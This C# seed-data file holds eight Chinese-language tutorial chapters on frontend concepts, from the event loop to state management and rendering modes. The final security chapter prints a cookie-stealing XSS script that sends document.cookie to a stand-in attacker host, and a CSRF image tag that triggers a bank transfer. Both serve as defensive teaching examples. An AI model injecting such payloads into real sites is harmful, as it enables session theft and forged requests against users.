using DotNetLearning.Models;

namespace DotNetLearning.Data;

public static class SeedChapters_ConceptFrontend
{
    public static List<Chapter> GetChapters() => new()
    {
        new() { Id=1900, Category="concept-frontend", Order=1, Level="intermediate", Icon="🔄", Title="Event Loop：為什麼 JS 是單執行緒？", Slug="concept-event-loop", IsPublished=true, Content=@"
# Event Loop：為什麼 JS 是單執行緒？

## JavaScript 只有一條執行緒

```
❌ 錯誤理解：setTimeout 會開新執行緒
✅ 正確理解：setTimeout 把回呼放進佇列，等主執行緒空了才執行
```

---

## 執行模型

```
┌─────────────────┐
│   Call Stack     │  ← 目前正在執行的程式碼
│   (執行堆疊)     │
└────────┬────────┘
         ↓ 空了才去拿
┌─────────────────┐
│  Microtask Queue │  ← Promise.then、queueMicrotask（優先）
└────────┬────────┘
         ↓ 微任務清空了才去拿
┌─────────────────┐
│  Macrotask Queue │  ← setTimeout、setInterval、I/O、事件
└─────────────────┘
```

---

## 經典面試題

```javascript
console.log('1');

setTimeout(() => {
    console.log('2');
}, 0);

Promise.resolve().then(() => {
    console.log('3');
});

console.log('4');

// 輸出順序：1, 4, 3, 2
// 1：同步，直接執行
// 4：同步，直接執行
// 3：微任務（Promise），優先於宏任務
// 2：宏任務（setTimeout），最後執行
```

---

## 為什麼不做成多執行緒？

```
問題：兩個執行緒同時操作 DOM 會怎樣？
執行緒 A：刪除一個按鈕
執行緒 B：改這個按鈕的文字
→ 衝突！

解決方案：
1. 加鎖（Lock）→ 太複雜，Web 開發者不想管
2. 保持單執行緒 → 簡單、不會有競爭條件

但需要非同步機制（Event Loop）避免 I/O 卡住 UI
```

---

## Web Workers（真正的多執行緒）

```javascript
// 需要 CPU 密集計算時
const worker = new Worker('heavy-calc.js');
worker.postMessage({ data: bigArray });
worker.onmessage = (e) => {
    console.log('計算結果:', e.data);
};
// Worker 在背景執行緒跑，不會卡住 UI
// 但 Worker 不能存取 DOM
```

> **記住：JS 是單執行緒 + Event Loop 處理非同步。不是沒有能力做多執行緒，而是刻意設計成這樣讓 DOM 操作更安全。**
" },

        new() { Id=1901, Category="concept-frontend", Order=2, Level="intermediate", Icon="🧠", Title="閉包與記憶體：為什麼會洩漏？", Slug="concept-closure-memory", IsPublished=true, Content=@"
# 閉包與記憶體：為什麼會洩漏？

## 閉包 = 函式 + 它記住的外部變數

```javascript
function createCounter() {
    let count = 0;  // ← 這個變數被閉包「抓住」了
    return () => ++count;
}

const counter = createCounter();
counter(); // 1
counter(); // 2
counter(); // 3
// count 不會被垃圾回收，因為 counter 還在引用它
```

---

## 為什麼會記憶體洩漏？

### 陷阱 1：事件監聽器沒移除

```javascript
function setupButton() {
    const data = new Array(1000000).fill('x'); // 大量資料

    document.getElementById('btn').addEventListener('click', () => {
        console.log(data.length); // 閉包引用了 data
    });
}

setupButton();
// data 永遠不會被回收，因為事件監聽器的閉包引用著它
// 即使你不再需要 data，它也一直佔著記憶體

// ✅ 修復：移除監聽器
const handler = () => console.log('clicked');
btn.addEventListener('click', handler);
// 不需要時
btn.removeEventListener('click', handler);
```

### 陷阱 2：定時器沒清除

```javascript
function startPolling() {
    const hugeData = fetchSomething();

    setInterval(() => {
        process(hugeData); // 閉包抓住 hugeData
    }, 1000);
}
// setInterval 永遠不會停止 → hugeData 永遠不會被回收

// ✅ 修復
const intervalId = setInterval(...);
clearInterval(intervalId); // 不需要時清除
```

### 陷阱 3：DOM 引用

```javascript
function setup() {
    const element = document.getElementById('modal');
    element.addEventListener('click', () => {
        element.style.display = 'none'; // 閉包引用 element
    });
    // 即使 modal 從 DOM 移除，JS 記憶體中還是有引用 → 不會被回收
}
```

---

## WeakMap / WeakRef

```javascript
// WeakMap 的 key 是弱引用，不阻止垃圾回收
const cache = new WeakMap();

let obj = { name: '小明' };
cache.set(obj, 'cached data');

obj = null; // obj 被回收 → WeakMap 中的 entry 也自動消失
// 不會造成記憶體洩漏！
```

---

## 如何檢測記憶體洩漏？

```
Chrome DevTools → Memory 分頁
1. 拍第一張 Heap Snapshot
2. 執行可疑的操作
3. 拍第二張 Heap Snapshot
4. 比較差異 → 看哪些物件增加了
```

> **閉包本身不是壞事（它是 JS 的核心特性），問題是忘了清理不再需要的引用。**
" },

        new() { Id=1902, Category="concept-frontend", Order=3, Level="advanced", Icon="🌳", Title="Virtual DOM：為什麼比直接操作快？", Slug="concept-virtual-dom", IsPublished=true, Content=@"
# Virtual DOM：為什麼比直接操作 DOM 快？

## 先釐清：Virtual DOM 不是「比 DOM 快」

```
❌ ""Virtual DOM 比真實 DOM 快""
✅ ""Virtual DOM 讓你不需要手動最佳化 DOM 操作""
```

---

## 真實 DOM 操作為什麼慢？

```javascript
// 每次操作 DOM 都觸發瀏覽器的渲染流程
element.style.width = '100px';  // → 重排（Reflow）
element.style.color = 'red';    // → 重繪（Repaint）
element.style.height = '50px';  // → 又重排
// 三次操作 = 三次渲染計算（瀏覽器可能合併，但不保證）

// 更糟的：
for (let i = 0; i < 1000; i++) {
    list.innerHTML += `<li>${i}</li>`; // 每次都重建整個 list！
}
```

---

## Virtual DOM 的流程

```
1. State 改變
   ↓
2. 建立新的 Virtual DOM（純 JS 物件，很快）
   ↓
3. 和舊的 Virtual DOM 做 Diff（找出差異）
   ↓
4. 只更新有變化的真實 DOM 節點（最小化 DOM 操作）
```

```javascript
// Virtual DOM 就是 JS 物件
const vdom = {
    tag: 'div',
    props: { className: 'card' },
    children: [
        { tag: 'h1', children: ['Hello'] },
        { tag: 'p', children: ['World'] },
    ]
};
// 比真實 DOM 節點輕量得多
```

---

## Diff 演算法

```
舊 VDOM:              新 VDOM:
<ul>                  <ul>
  <li>A</li>            <li>A</li>
  <li>B</li>            <li>B</li>   ← 沒變
  <li>C</li>            <li>D</li>   ← 改了（只更新這個）
</ul>                   <li>E</li>   ← 新增
                      </ul>

→ 真實 DOM 操作：
  1. 把第三個 <li> 的文字從 C 改成 D
  2. 新增一個 <li>E</li>
→ 只碰了 2 個節點，不是重建整個列表
```

### Key 的重要性

```jsx
// ❌ 沒有 key → React 不知道哪個項目對應哪個，整個重建
{items.map(item => <li>{item.name}</li>)}

// ✅ 有 key → React 精確知道哪個項目變了
{items.map(item => <li key={item.id}>{item.name}</li>)}
```

---

## 什麼時候 Virtual DOM 反而慢？

```
1. 極少的 DOM 操作（直接改一個元素比建 VDOM + diff 快）
2. 大量節點的初始渲染（建立 VDOM 本身有成本）
3. 超高頻更新（Canvas 動畫不適合用 React）
```

> **Virtual DOM 的價值不是「最快」，而是讓你用「宣告式」寫 UI，框架自動幫你做最佳化。手動操作 DOM 做得好可以更快，但很難維護。**

---

## 替代方案

```
Svelte：編譯時期就知道哪裡會變，不需要 VDOM
→ 編譯成直接操作 DOM 的程式碼
→ 執行時更快（沒有 diff 開銷）
→ 但生態系不如 React/Vue

SolidJS：響應式信號，細粒度更新
→ 只更新有變化的 DOM 節點
→ 不需要 VDOM diff
```
" },

        new() { Id=1903, Category="concept-frontend", Order=4, Level="intermediate", Icon="📊", Title="狀態管理：為什麼需要 Redux/Pinia？", Slug="concept-state-management", IsPublished=true, Content=@"
# 狀態管理：為什麼需要 Redux/Pinia？

## 問題：Props Drilling

```
App
├── Header
│   └── UserAvatar ← 需要 user
├── Sidebar
│   └── CartCount ← 需要 cart
└── Main
    └── ProductList
        └── ProductCard
            └── AddToCartButton ← 需要 cart + user

user 資料在 App 層，要傳到 UserAvatar 要穿過 Header
cart 資料要從 App → Main → ProductList → ProductCard → AddToCartButton
→ 中間的元件根本不需要這些資料，但被迫要傳遞
→ 這就是 ""Props Drilling""（Props 穿透）
```

---

## 解法 1：Context API（React）/ Provide-Inject（Vue）

```javascript
// React Context
const UserContext = createContext();

function App() {
    return (
        <UserContext.Provider value={user}>
            <Header /> {/* 不需要傳 props */}
        </UserContext.Provider>
    );
}

function UserAvatar() {
    const user = useContext(UserContext); // 直接取
}
```

```
優點：內建、不需要額外套件
缺點：
- 值改變時，所有用到 Context 的元件都會重新渲染
- 不適合頻繁變化的資料
- 沒有 devtools、中間件
```

---

## 解法 2：狀態管理庫（Redux / Pinia / Zustand）

```
核心概念：
┌──────────────────┐
│     Store        │  ← 全域狀態（Single Source of Truth）
│  ┌────────────┐  │
│  │ state      │  │  ← 資料
│  │ getters    │  │  ← 計算屬性（derived state）
│  │ actions    │  │  ← 改變狀態的方法
│  └────────────┘  │
└──────────────────┘
         ↕
    任何元件都能直接存取
```

---

## 什麼時候需要？什麼時候不需要？

| 需要 | 不需要 |
|------|--------|
| 多個不相關的元件共享資料 | 父子元件間傳遞（用 props） |
| 使用者登入狀態 | 表單的臨時輸入值 |
| 購物車 | Modal 的開關狀態 |
| 複雜的資料同步邏輯 | 簡單的 CRUD 頁面 |

> **Dan Abramov（Redux 作者）：""如果你不確定需不需要 Redux，那你不需要。""**

---

## 現代趨勢

```
2016：Redux 一統天下（嚴格的 action + reducer）
2020：Redux Toolkit 簡化（減少 boilerplate）
2022：Zustand / Jotai / Pinia 崛起（更簡單、更少概念）
2024：Server Components（React）把狀態移回伺服器

趨勢：越來越簡單、越來越少全域狀態
很多「需要」全域狀態的場景，其實用 URL 參數、Server State（React Query / SWR）就能解決
```

> **能用 props 解決就用 props，能用 Context 就用 Context，真的需要時才上狀態管理庫。**
" },

        new() { Id=1904, Category="concept-frontend", Order=5, Level="intermediate", Icon="🖥️", Title="SSR vs CSR vs SSG：怎麼選？", Slug="concept-ssr-csr-ssg", IsPublished=true, Content=@"
# SSR vs CSR vs SSG：怎麼選？

## 三種渲染模式

### CSR（Client-Side Rendering）客戶端渲染

```
瀏覽器收到空 HTML → 載入 JS → JS 渲染畫面

1. 伺服器回傳：<div id=""app""></div> + <script src=""bundle.js"">
2. 瀏覽器下載 bundle.js（可能 500KB+）
3. JS 執行，建立 DOM，畫面才出現
4. 使用者看到畫面（可能已經過了 2-3 秒）
```

| 優點 | 缺點 |
|------|------|
| 互動體驗好（SPA） | 首屏慢（要等 JS 載入+執行） |
| 伺服器負擔小 | SEO 差（爬蟲看到空 HTML） |
| 前後端完全分離 | 需要 Loading 狀態 |

### SSR（Server-Side Rendering）伺服器端渲染

```
伺服器渲染完整 HTML → 瀏覽器直接顯示 → 載入 JS → 變成互動式

1. 伺服器執行 React/Vue，產生完整 HTML
2. 瀏覽器收到 HTML，立刻顯示（首屏快）
3. JS 載入後 ""Hydration""（注入互動性）
4. 變成完整的 SPA
```

| 優點 | 缺點 |
|------|------|
| 首屏快（HTML 直接顯示） | 伺服器負擔大（每次請求都要渲染） |
| SEO 好（爬蟲看到完整內容） | 開發複雜（要處理 Server/Client 差異） |
| 社群分享有預覽 | TTFB 較慢（伺服器要花時間渲染） |

### SSG（Static Site Generation）靜態生成

```
建置時就產生所有 HTML → 部署靜態檔案 → CDN 分發

1. 建置時（build time）：執行每個頁面，產生 .html 檔案
2. 部署到 CDN（Vercel、Cloudflare Pages）
3. 使用者請求 → CDN 直接回傳 HTML（超快）
```

| 優點 | 缺點 |
|------|------|
| 最快（靜態檔案 + CDN） | 不適合動態內容（使用者資料） |
| 最安全（沒有伺服器） | 建置時間隨頁面數量增加 |
| 最便宜（不需要伺服器） | 更新需要重新建置 |

---

## 怎麼選？

| 場景 | 推薦 |
|------|------|
| 部落格、文件網站 | SSG（Astro、Hugo） |
| 電商、新聞網站 | SSR（Next.js、Nuxt） |
| 後台管理系統 | CSR（Vite + React/Vue） |
| 學習平台（DevLearn） | MVC SSR（你現在的做法）✅ |

> **你的 DevLearn 用 ASP.NET MVC 是 Server-Side Rendering，Razor 在伺服器渲染 HTML。這對 SEO 和首屏速度都很好。**
" },

        new() { Id=1905, Category="concept-frontend", Order=6, Level="intermediate", Icon="🔒", Title="TypeScript：為什麼要加型別？", Slug="concept-typescript-why", IsPublished=true, Content=@"
# TypeScript：為什麼要加型別？

## JavaScript 的問題

```javascript
function add(a, b) {
    return a + b;
}

add(1, 2);       // 3 ✅
add('1', 2);     // '12' ← 字串串接！不是你想要的
add(null, 2);    // 2 ← 沒有報錯，但邏輯可能有問題
add({}, []);     // '[object Object]' ← WTF
```

```javascript
// 你呼叫一個 API 回傳的物件
const user = await getUser(1);
user.nmae; // typo！但 JS 不會報錯，只會回傳 undefined
// 直到上線後使用者反映「名字沒顯示」你才發現
```

---

## TypeScript 怎麼解決？

```typescript
function add(a: number, b: number): number {
    return a + b;
}

add(1, 2);     // ✅
add('1', 2);   // ❌ 編譯時就報錯：Argument of type 'string' is not assignable
```

```typescript
interface User {
    id: number;
    name: string;
    email: string;
}

const user: User = await getUser(1);
user.nmae; // ❌ 編譯時報錯：Property 'nmae' does not exist. Did you mean 'name'?
```

---

## 常見反對意見

```
""寫 TypeScript 太慢了，要多寫很多型別""
→ IDE 自動推斷大部分型別，不需要全部手寫
→ 前期慢 10%，debug 省 50%

""小專案不需要""
→ 確實，個人小工具用 JS 就好
→ 但超過 2 人的團隊、或活超過 3 個月的專案，TS 回本很快

""any 就好了""
→ any 等於沒有 TypeScript，那你用 JS 就好了
→ unknown 比 any 安全（強制你做型別檢查後才能使用）
```

---

## 什麼時候用 TS / 什麼時候用 JS？

| 用 TypeScript | 用 JavaScript |
|--------------|---------------|
| 團隊開發 | 個人小工具 |
| 長期維護的專案 | Prototype / PoC |
| 大型 SPA | 簡單的腳本 |
| 需要 IDE 自動補全 | 快速試驗 |
| API 介面定義 | 一次性的自動化 |

> **TypeScript 不是銀彈，但在 2024 年，新的前端專案「預設用 TypeScript」已經是業界共識。**
" },

        new() { Id=1906, Category="concept-frontend", Order=7, Level="intermediate", Icon="🚀", Title="前端效能優化策略", Slug="concept-frontend-performance", IsPublished=true, Content=@"
# 前端效能優化策略

## Core Web Vitals（Google 排名指標）

```
LCP（Largest Contentful Paint）：最大內容繪製 < 2.5 秒
→ 主要內容多快出現？

FID（First Input Delay）：首次輸入延遲 < 100ms
→ 使用者點擊後多快有反應？

CLS（Cumulative Layout Shift）：累計版面位移 < 0.1
→ 頁面載入時內容有沒有跳動？
```

---

## 載入優化

### 1. 減少 JS Bundle 大小

```javascript
// ❌ 載入整個 lodash（70KB）
import _ from 'lodash';
_.debounce(fn, 300);

// ✅ 只載入需要的函式（3KB）
import debounce from 'lodash/debounce';
debounce(fn, 300);
```

### 2. 懶載入（Lazy Loading）

```javascript
// 路由級懶載入
const AdminPage = React.lazy(() => import('./AdminPage'));
// 進入 /admin 路由時才下載 AdminPage 的程式碼

// 圖片懶載入
<img src=""photo.jpg"" loading=""lazy"" alt=""..."">
// 圖片進入視窗才開始載入
```

### 3. 壓縮

```
Gzip / Brotli 壓縮：JS/CSS 體積減少 60-80%
圖片格式：WebP 比 JPEG 小 25-35%，AVIF 更小
字體：只載入用到的字元（中文字體子集化）
```

---

## 渲染優化

### 重排（Reflow）vs 重繪（Repaint）

```
重排（Reflow）— 改變幾何屬性（最貴）：
width, height, margin, padding, display, position
→ 重新計算佈局 → 觸發重繪

重繪（Repaint）— 改變外觀屬性（較便宜）：
color, background, visibility, border-color
→ 不需要重新計算佈局

最佳化（Composite）— 只影響合成層（最便宜）：
transform, opacity
→ GPU 處理，不觸發重排或重繪
```

```css
/* ❌ 觸發重排 */
.animate { left: 100px; } /* 改 left 觸發重排 */

/* ✅ 只觸發 Composite */
.animate { transform: translateX(100px); } /* GPU 加速，不觸發重排 */
```

### React / Vue 的渲染優化

```javascript
// React：用 React.memo 避免不必要的重新渲染
const ExpensiveList = React.memo(({ items }) => {
    return items.map(item => <Item key={item.id} {...item} />);
});
// 只有 items 真的改變時才重新渲染

// Vue：computed 自動快取
const filteredItems = computed(() => {
    return items.value.filter(i => i.active); // 只有 items 變化時才重新計算
});
```

---

## 網路優化

```
1. CDN：靜態資源放 CDN（離使用者近）
2. 快取：設定合適的 Cache-Control Header
3. 預載入：<link rel=""preload""> 重要資源
4. HTTP/2：多路復用，不需要合併檔案
5. 減少請求：CSS Sprites、Icon Font → SVG Icons
```

> **80% 的效能問題來自 20% 的原因。先用 Lighthouse 找出瓶頸，再針對性優化，不要盲目優化。**
" },

        new() { Id=1907, Category="concept-frontend", Order=8, Level="intermediate", Icon="🔐", Title="前端安全：XSS、CSRF 原理與防禦", Slug="concept-frontend-security", IsPublished=true, Content=@"
# 前端安全：XSS、CSRF 原理與防禦

## XSS（Cross-Site Scripting）跨站腳本攻擊

### 原理

```
攻擊者在你的網站注入惡意 JavaScript
→ 偷使用者的 Cookie / Token
→ 假冒使用者操作
→ 導向釣魚網站
```

### 三種 XSS

```
1. Stored XSS（儲存型）— 最危險
攻擊者在留言板寫：<script>fetch('hacker.com?cookie='+document.cookie)</script>
→ 存入資料庫
→ 其他使用者瀏覽留言板 → 惡意腳本執行 → Cookie 被偷

2. Reflected XSS（反射型）
攻擊者製作連結：example.com/search?q=<script>alert('XSS')</script>
→ 伺服器把 q 參數直接放入 HTML 回傳
→ 使用者點連結 → 腳本執行

3. DOM-based XSS
攻擊者利用前端 JS 的漏洞
→ document.innerHTML = userInput; ← 直接插入使用者輸入
```

### 防禦

```csharp
// 後端：Razor 預設會 HTML 編碼
@Model.UserInput  // 自動轉義 < > & 等字元 ✅

// 前端：用 textContent 而不是 innerHTML
element.textContent = userInput;  // ✅ 安全
element.innerHTML = userInput;     // ❌ 危險！

// CSP Header（Content Security Policy）
Content-Security-Policy: default-src 'self'; script-src 'self'
// 只允許載入自己網域的腳本
```

---

## CSRF（Cross-Site Request Forgery）跨站請求偽造

### 原理

```
1. 使用者登入了 bank.com（Cookie 存著登入狀態）
2. 使用者瀏覽惡意網站 evil.com
3. evil.com 的頁面包含：
   <img src=""https://bank.com/transfer?to=hacker&amount=10000"">
4. 瀏覽器自動帶上 bank.com 的 Cookie 發送請求
5. 銀行以為是使用者本人操作 → 轉帳成功！
```

### 防禦

```csharp
// ASP.NET Core：Anti-Forgery Token
<form method=""post"">
    @Html.AntiForgeryToken()  // 產生隱藏的 token
    <button type=""submit"">送出</button>
</form>

[ValidateAntiForgeryToken]  // 驗證 token
public IActionResult Submit() { }

// SameSite Cookie（現代瀏覽器預設）
Set-Cookie: session=xxx; SameSite=Lax
// Lax：跨站 GET 可以帶 Cookie，POST 不行
// Strict：跨站完全不帶 Cookie
```

---

## JWT 存在哪裡最安全？

```
localStorage：
❌ XSS 可以直接讀取

sessionStorage：
❌ XSS 也可以讀取（但關閉分頁就消失）

HttpOnly Cookie：
✅ JavaScript 讀不到（防 XSS）
✅ 但要防 CSRF（用 SameSite + Anti-Forgery Token）

Memory（JS 變數）：
✅ 最安全，但重新整理就消失
→ 搭配 Refresh Token（存在 HttpOnly Cookie）使用
```

> **沒有 100% 安全的方案，只有「足夠安全」的方案。多層防禦（Defense in Depth）是正確的思維。**
" },
    };
}
